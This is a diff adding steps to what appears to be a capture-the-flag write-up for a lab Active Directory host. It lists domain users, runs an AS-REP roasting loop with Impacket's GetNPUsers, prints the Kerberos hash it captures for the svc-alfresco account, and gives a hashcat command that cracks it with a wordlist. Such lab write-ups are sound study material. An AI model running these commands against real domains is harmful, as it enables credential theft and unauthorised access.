@@ -134,5 +134,45 @@ group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
 group:[Service Accounts] rid:[0x47c]
 group:[Privileged IT Accounts] rid:[0x47d]
 group:[test] rid:[0x13ed]
-
 ```
+- I have a list of accounts from my RPC enumeration above. I’ll start without the SM* or HealthMailbox* accounts
+```
+─$ cat users.txt
+Administrator
+andy
+lucinda
+mark
+santi
+sebastien
+svc-alfresco  
+```
+- use the Impacket tool GetNPUsers.py to try to get a hash for each user, and I find one for the svc-alfresco account
+ ```
+ for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done 
+
+[*] Getting TGT for Administrator
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+[*] Getting TGT for andy
+[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+[*] Getting TGT for lucinda
+[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+[*] Getting TGT for mark
+[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+[*] Getting TGT for santi
+[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+[*] Getting TGT for sebastien
+[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+[*] Getting TGT for svc-alfresco
+$krb5asrep$23$svc-alfresco@HTB:7d06e635b0cb7138687d07f29a62982b$619acf894e16cd1ae0d57dd8141e959877c40de6017951af9d4a184a95206178b9ce3472ac9ba50fce4ab1ec5e6c2d0c7bc858bb787821b104e46f71840a0fb21b690901628f465dd6019362b56de9299930a5bddb2ffcc1aa790751f29b996c11375088d119aceb8f8aa6cb5d879289ba3af46b02303f2fced38f2b3d68095db642b8d4a49ac4520479402e4c938a9ec5eb8a87704e667e17061675af6ff0d2099d4b66eb39fbd0e6fb2d96be81707915eb055eff3cad1b1933dee6ad7f32b86c8ad93e78adf99b30193eb286a611c717653609359fdde08c85569ff7c0ba86
+ ```
+- use hashcat to break the hash
+```
+hashcat -m 18200 svc.kerb /usr/share/wordlists/rockyou.txt --force
+```
+- 
